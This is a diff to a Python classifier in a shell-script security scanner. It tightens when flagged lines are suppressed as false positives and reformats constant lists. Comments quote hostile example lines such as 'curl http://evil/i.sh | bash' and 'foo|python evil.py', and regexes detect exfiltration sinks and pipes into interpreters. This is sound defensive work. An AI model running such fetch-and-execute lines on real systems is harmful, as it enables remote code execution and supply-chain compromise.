@@ -107,15 +107,27 @@ def _match_inside_regex_arg_shell(line: str, match: str) -> bool:
     Real shell pipe ``cmd | python script.py`` stays visible because
     the binary name appears OUTSIDE any quoted regex on the line.
     """
-    # Find all grep/awk/sed regex argument spans on the line
-    for m in _REGEX_TOOL_CALL_RE_SHELL.finditer(line):
-        regex_start = m.start("regex")
-        regex_end = m.end("regex")
-        # Find the position of `match` in the original line
-        match_pos = line.find(match)
-        if match_pos != -1 and regex_start <= match_pos <= regex_end:
-            return True
-    return False
+    if not match:
+        return False
+    # Collect every grep/awk/sed quoted-regex span on the line.
+    regex_spans = [(m.start("regex"), m.end("regex")) for m in _REGEX_TOOL_CALL_RE_SHELL.finditer(line)]
+    if not regex_spans:
+        return False
+    # The catalog gives no column for the match, so locate EVERY occurrence of
+    # the ``|binary`` token. Suppress only when ALL occurrences sit inside a
+    # quoted regex span — if even one occurrence is OUTSIDE every span, a REAL
+    # shell pipe exists on the line and the finding must stay visible. Using
+    # ``line.find`` (first occurrence only) silently suppressed a genuine
+    # ``foo|python evil.py`` pipe whenever the same token also appeared inside
+    # an earlier ``grep -E "(node|python)"`` regex — a security false-negative.
+    found_any = False
+    pos = line.find(match)
+    while pos != -1:
+        found_any = True
+        if not any(start <= pos <= end for start, end in regex_spans):
+            return False  # this occurrence is a real pipe outside any regex
+        pos = line.find(match, pos + 1)
+    return found_any
 
 
 # r08 sangrokjung FP iter1 (2026-05-28) — shell execution-class rules
@@ -180,9 +192,21 @@ _SHELL_TEST_BLANKET_SUPPRESS_RULES: Final[frozenset[str]] = frozenset(
 
 # r10-final FP iter (2026-05-28) — Shell test-file detection.
 _SHELL_TEST_FILE_PATTERNS: Final[tuple[str, ...]] = (
-    "/tests/", "/test/", "/__tests__/", "/specs/", "/spec/",
-    "test-", "test_", "/test.", "_test.", ".test.", ".spec.",
-    "/fixtures/", "/__fixtures__/", "/mocks/", "/__mocks__/",
+    "/tests/",
+    "/test/",
+    "/__tests__/",
+    "/specs/",
+    "/spec/",
+    "test-",
+    "test_",
+    "/test.",
+    "_test.",
+    ".test.",
+    ".spec.",
+    "/fixtures/",
+    "/__fixtures__/",
+    "/mocks/",
+    "/__mocks__/",
 )
 
 
@@ -319,30 +343,85 @@ _SHELL_LITERAL_ARG_CMDSUB_RE: Final[re.Pattern[str]] = re.compile(
 #   $($USER_SUPPLIED_CMD)
 _SAFE_CMDSUB_DATA_COMMANDS: Final[frozenset[str]] = frozenset(
     {
-        "cat", "ls", "head", "tail", "wc", "grep", "egrep", "fgrep", "rg",
-        "sed", "awk", "gawk", "mawk", "jq", "yq", "cut", "tr", "sort",
-        "uniq", "dirname", "basename", "realpath", "readlink", "pwd",
-        "date", "stat", "find", "od", "xxd", "printf", "echo", "uname",
-        "hostname", "whoami", "id", "sw_vers", "defaults", "scutil",
-        "sysctl", "tput", "stty", "expr", "seq", "column", "fold", "nl",
-        "rev", "paste", "comm", "type", "command", "which", "ps", "df",
-        "du", "git", "openssl", "md5", "md5sum", "shasum", "sha256sum",
-        "cksum", "test", "true", "false", "env", "jobs", "tty",
+        "cat",
+        "ls",
+        "head",
+        "tail",
+        "wc",
+        "grep",
+        "egrep",
+        "fgrep",
+        "rg",
+        "sed",
+        "awk",
+        "gawk",
+        "mawk",
+        "jq",
+        "yq",
+        "cut",
+        "tr",
+        "sort",
+        "uniq",
+        "dirname",
+        "basename",
+        "realpath",
+        "readlink",
+        "pwd",
+        "date",
+        "stat",
+        "find",
+        "od",
+        "xxd",
+        "printf",
+        "echo",
+        "uname",
+        "hostname",
+        "whoami",
+        "id",
+        "sw_vers",
+        "defaults",
+        "scutil",
+        "sysctl",
+        "tput",
+        "stty",
+        "expr",
+        "seq",
+        "column",
+        "fold",
+        "nl",
+        "rev",
+        "paste",
+        "comm",
+        "type",
+        "command",
+        "which",
+        "ps",
+        "df",
+        "du",
+        "git",
+        "openssl",
+        "md5",
+        "md5sum",
+        "shasum",
+        "sha256sum",
+        "cksum",
+        "test",
+        "true",
+        "false",
+        "env",
+        "jobs",
+        "tty",
     }
 )
 # curl / wget / http(ie) head a substitution that FETCHES data; benign
 # only when their output is captured / piped to a data processor and NOT
 # to a shell interpreter (the latter is the supply-chain exec shape and
 # is kept visible by ``_SHELL_INTERPRETER_PIPE_RE``).
-_NET_CAPTURE_CMDSUB_COMMANDS: Final[frozenset[str]] = frozenset(
-    {"curl", "wget", "http", "https", "fetch", "wget2"}
-)
+_NET_CAPTURE_CMDSUB_COMMANDS: Final[frozenset[str]] = frozenset({"curl", "wget", "http", "https", "fetch", "wget2"})
 
 # First token after ``$(`` (skipping leading whitespace). A leading ``$``
 # (i.e. ``$($CMD)`` / ``$(${cmd})``) does NOT match → kept visible.
-_CMDSUB_HEAD_RE: Final[re.Pattern[str]] = re.compile(
-    r"\$\(\s*(?P<cmd>[A-Za-z_][A-Za-z0-9_.+-]*)"
-)
+_CMDSUB_HEAD_RE: Final[re.Pattern[str]] = re.compile(r"\$\(\s*(?P<cmd>[A-Za-z_][A-Za-z0-9_.+-]*)")
 # A pipe into a real interpreter that executes stdin AS CODE. The
 # negative lookahead exempts ``perl``/``python``/``ruby``/``php`` when an
 # inline ``-e`` / ``-pe`` / ``-ne`` SCRIPT flag is present (the program is
@@ -469,9 +548,7 @@ def _pipe_to_text_processor(line: str, match: str) -> bool:
 #  (F) ``subprocess.run(['git', ...])`` LIST-form bypasses the shell — the
 #      argv is executed directly by the OS, no shell interpretation — so
 #      there is no shell-injection surface (``shell=True`` is kept visible).
-_PYTHON_RAWSTRING_LITERAL_LINE_RE: Final[re.Pattern[str]] = re.compile(
-    r"^\s*r(?P<q>['\"]).*?(?P=q)\s*,?\s*(?:#.*)?$"
-)
+_PYTHON_RAWSTRING_LITERAL_LINE_RE: Final[re.Pattern[str]] = re.compile(r"^\s*r(?P<q>['\"]).*?(?P=q)\s*,?\s*(?:#.*)?$")
 _SUBPROCESS_CALL_RE: Final[re.Pattern[str]] = re.compile(
     r"\bsubprocess\.(?:run|Popen|call|check_output|check_call)\s*\("
 )
@@ -584,9 +661,7 @@ _WRITE_INTENT_RE: Final[re.Pattern[str]] = re.compile(
 # r10-final FP iter (2026-05-28) — Nerd Font / Powerline icon byte
 # sequences. ``printf '\\xNN\\xNN\\xNN'`` with a nearby ``# U+XXXX``
 # Unicode codepoint comment is a statusline rendering primitive.
-_NERD_FONT_PRINTF_RE: Final[re.Pattern[str]] = re.compile(
-    r"printf\s+['\"]?\\x[0-9A-Fa-f]{2}\\x[0-9A-Fa-f]{2}"
-)
+_NERD_FONT_PRINTF_RE: Final[re.Pattern[str]] = re.compile(r"printf\s+['\"]?\\x[0-9A-Fa-f]{2}\\x[0-9A-Fa-f]{2}")
 _UNICODE_CODEPOINT_COMMENT_RE: Final[re.Pattern[str]] = re.compile(
     r"#\s*U\+[0-9A-Fa-f]{4,6}\b",
     re.IGNORECASE,
@@ -635,12 +710,20 @@ def _match_inside_shell_echo_string(line: str, match: str) -> bool:
         body = m.group("body_dq")
         if body is None:
             body = m.group("body_sq") or ""
-        # Use simple substring check — the matched text should appear in the body
+        # The matched command token must appear IN FULL inside the display
+        # string for the match to be "inside the echo". ``body`` is extracted
+        # from the complete source line (never the truncated ``lineContent``),
+        # so a genuinely in-string command — even when the catalog ``match`` was
+        # truncated to its first 100 chars — is still a substring of ``body``.
+        #
+        # A short-prefix fallback (``match[:8] in body``) was REMOVED here: an
+        # 8-char prefix collides with arbitrary display text, which silently
+        # suppressed a REAL invocation sitting OUTSIDE the string whenever its
+        # first 8 chars happened to appear inside the printed text — e.g.
+        # ``echo 'see curl http docs'; curl http://evil/i.sh | bash`` (the
+        # ``curl htt`` prefix matched the banner, hiding the live ``| bash``
+        # supply-chain attack). Exact containment is the security-safe test.
         if match in body:
-            return True
-        # Try first chars of match (catalog matches are often truncated)
-        # If the first ~8 chars of match are in body, count it as inside
-        if len(match) > 4 and match[:8] in body:
             return True
     return False
 
@@ -751,8 +834,7 @@ def _exfil_position_ref(line: str, var: str) -> bool:
     (``-d``/``--data*`` …``$VAR``) on ``line`` — i.e. an exfil sink."""
     var_ref = r"\$\{?" + re.escape(var) + r"\}?"
     exfil_re = re.compile(
-        r"[?&][^=\s&\"']+=[^\s\"'&]*" + var_ref
-        + r"|(?:-d|--data(?:-raw|-binary|-urlencode|-ascii)?)\b[^\n]*" + var_ref
+        r"[?&][^=\s&\"']+=[^\s\"'&]*" + var_ref + r"|(?:-d|--data(?:-raw|-binary|-urlencode|-ascii)?)\b[^\n]*" + var_ref
     )
     return bool(exfil_re.search(line))
 
@@ -837,18 +919,29 @@ def _match_inside_case_pattern(lines: list[str], line_idx: int, match: str) -> b
 _POSITIONAL_INPUT_RE: Final[re.Pattern[str]] = re.compile(
     r"\$[1-9]\b|\$[{(]\s*[1-9@*#]|\$[@*]|\$\{?REPLY\b|\bread\b\s+-?\w"
 )
-_SCHEME_LITERAL_HOST_RE: Final[re.Pattern[str]] = re.compile(
-    r"https?://[A-Za-z0-9.\-]+"
-)
+_SCHEME_LITERAL_HOST_RE: Final[re.Pattern[str]] = re.compile(r"https?://[A-Za-z0-9.\-]+")
 _VAR_REF_RE: Final[re.Pattern[str]] = re.compile(r"\$\{?(?P<name>[A-Za-z_]\w*)")
 # URL-bearing variable NAMES, matched per identifier-token (split on ``_``
 # and camelCase) so ``CURL_OPTS`` → {CURL, OPTS} does NOT count as a URL var
 # while ``API_ENDPOINT`` → {API, ENDPOINT} and ``baseUrl`` → {base, Url} do.
 _URLISH_NAME_TOKENS: Final[frozenset[str]] = frozenset(
     {
-        "url", "urls", "uri", "uris", "endpoint", "endpoints", "target",
-        "host", "hostname", "link", "addr", "address", "href", "src",
-        "origin", "baseurl",
+        "url",
+        "urls",
+        "uri",
+        "uris",
+        "endpoint",
+        "endpoints",
+        "target",
+        "host",
+        "hostname",
+        "link",
+        "addr",
+        "address",
+        "href",
+        "src",
+        "origin",
+        "baseurl",
     }
 )
 
@@ -862,10 +955,7 @@ def _name_is_urlish(name: str) -> bool:
 def _resolve_shell_var(lines: list[str], upto_idx: int, var: str) -> str | None:
     """Return the RHS of the LAST ``var=…`` assignment before ``upto_idx``,
     or ``None`` if unassigned in-file."""
-    assign_re = re.compile(
-        r"^\s*(?:export\s+|local\s+|declare\s+(?:-\w+\s+)?)?"
-        + re.escape(var) + r"\+?=(.*)$"
-    )
+    assign_re = re.compile(r"^\s*(?:export\s+|local\s+|declare\s+(?:-\w+\s+)?)?" + re.escape(var) + r"\+?=(.*)$")
     val: str | None = None
     for i in range(min(upto_idx, len(lines))):
         m = assign_re.match(lines[i])
@@ -931,12 +1021,8 @@ def _curl_target_host_is_constant(lines: list[str], line_idx: int) -> bool:
 # exactly two frames and CANNOT loop. Suppress only that exact bounded
 # shape; a ``setInterval`` (inherently repeating) or a self-rescheduling rAF
 # loop stays visible.
-_PROMISE_RESOLVER_RE: Final[re.Pattern[str]] = re.compile(
-    r"new\s+Promise\s*\(\s*\(?\s*(?P<res>[A-Za-z_$][\w$]*)"
-)
-_INNER_RAF_ARG_RE: Final[re.Pattern[str]] = re.compile(
-    r"requestAnimationFrame\s*\(\s*(?P<arg>[A-Za-z_$][\w$]*)\s*\)"
-)
+_PROMISE_RESOLVER_RE: Final[re.Pattern[str]] = re.compile(r"new\s+Promise\s*\(\s*\(?\s*(?P<res>[A-Za-z_$][\w$]*)")
+_INNER_RAF_ARG_RE: Final[re.Pattern[str]] = re.compile(r"requestAnimationFrame\s*\(\s*(?P<arg>[A-Za-z_$][\w$]*)\s*\)")
 
 
 def _is_bounded_promise_double_raf(line: str) -> bool:
@@ -980,12 +1066,7 @@ def classify(
     if not file_path:
         return ""
     fp = file_path.lower()
-    if not (
-        fp.endswith(".sh")
-        or fp.endswith(".bash")
-        or fp.endswith(".zsh")
-        or fp.endswith(".fish")
-    ):
+    if not (fp.endswith(".sh") or fp.endswith(".bash") or fp.endswith(".zsh") or fp.endswith(".fish")):
         return ""
     lines = content.split("\n")
     if line_idx < 0 or line_idx >= len(lines):
@@ -1112,7 +1193,13 @@ def classify(
     # network, etc.). Loopback / private IPs cannot reach the public
     # internet. Iron rule preserved: cloud metadata endpoint
     # 169.254.169.254 stays visible (attacker-reachable from cloud VMs).
-    if rule_id in ("NET_SUSPICIOUS", "CMD_INJECTION", "SUPPLY_CHAIN", "URL_RAW_IP", "SSRF_PATTERN") and _line_has_loopback_or_private_ip_shell(line_text):
+    if rule_id in (
+        "NET_SUSPICIOUS",
+        "CMD_INJECTION",
+        "SUPPLY_CHAIN",
+        "URL_RAW_IP",
+        "SSRF_PATTERN",
+    ) and _line_has_loopback_or_private_ip_shell(line_text):
         return "safe_literal"
 
     if line_idx == 0:
